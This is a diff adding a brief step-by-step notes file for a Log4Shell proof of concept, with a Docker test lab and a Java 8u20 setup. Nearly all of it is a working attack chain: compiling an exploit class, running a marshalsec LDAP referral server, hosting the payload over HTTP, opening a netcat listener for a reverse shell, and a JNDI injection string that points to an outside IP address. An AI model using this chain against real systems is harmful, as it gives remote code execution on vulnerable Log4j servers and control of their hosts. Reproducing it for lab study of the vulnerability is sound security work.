@@ -1,0 +1,30 @@
+
+--1--
+./jdk1.8.0_20/bin/javac Exploit.java
+--2--
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ipadress:8000/#Exploit"
+--3--
+python3 -m http.server 8000
+--4--
+nc -lvp 31415
+--5--
+${jndi:ldap://195.142.64.202:1389/Exploit}
+
+
+------------------------------
+Docker setup and test lab start.
+
+1: docker build -t log4j-shell-poc .
+2: docker run --network host log4j-shell-poc
+
+
+
+-extra-
+
+(java kurulumu
+tar -xf jdk-8u20-linux-x64.tar.gz
+./jdk1.8.0_20/bin/java -version
+java version "1.8.0_20"
+Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
+Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
+)
